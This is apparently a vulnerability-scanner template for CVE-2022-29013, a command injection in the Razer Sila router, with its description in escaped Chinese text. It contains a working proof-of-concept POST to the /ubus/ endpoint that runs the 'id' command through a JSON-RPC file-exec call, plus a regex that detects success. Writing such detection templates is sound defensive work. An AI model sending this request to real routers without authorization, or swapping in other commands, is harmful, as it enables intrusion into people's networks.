expression: r0()
id: CVE-2022-29013
info:
  author: Kevin Randall
  description: "Razer Sila \u8DEF\u7531\u5668 v2.0.441_api-2.0.418 \u547D\u4EE4\u53C2\
    \u6570\u4E2D\u7684\u547D\u4EE4\u6CE8\u5165\u5141\u8BB8\u653B\u51FB\u8005\u901A\
    \u8FC7\u7CBE\u5FC3\u8BBE\u8BA1\u7684 POST \u8BF7\u6C42\u6267\u884C\u4EFB\u610F\
    \u547D\u4EE4\u3002"
  name: "Razer Sila - \u547D\u4EE4\u6CE8\u5165"
  reference:
  - https://packetstormsecurity.com/files/166684/Razer-Sila-2.0.418-Command-Injection.html
  - https://www.exploit-db.com/exploits/50865
  - https://www2.razer.com/ap-en/desktops-and-networking/razer-sila
  severity: high
rules:
  r0:
    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
    request:
      body: '{"jsonrpc":"2.0","id":3,"method":"call","params":["30ebdc7dd1f519beb4b2175e9dd8463e","file","exec",{"command":"id"}]}

        '
      headers:
        Origin: '{{hosturl}}'
        Referer: '{{hosturl}}'
        X-Requested-With: XMLHttpRequest
      method: POST
      path: /ubus/
set:
  hosturl: request.url
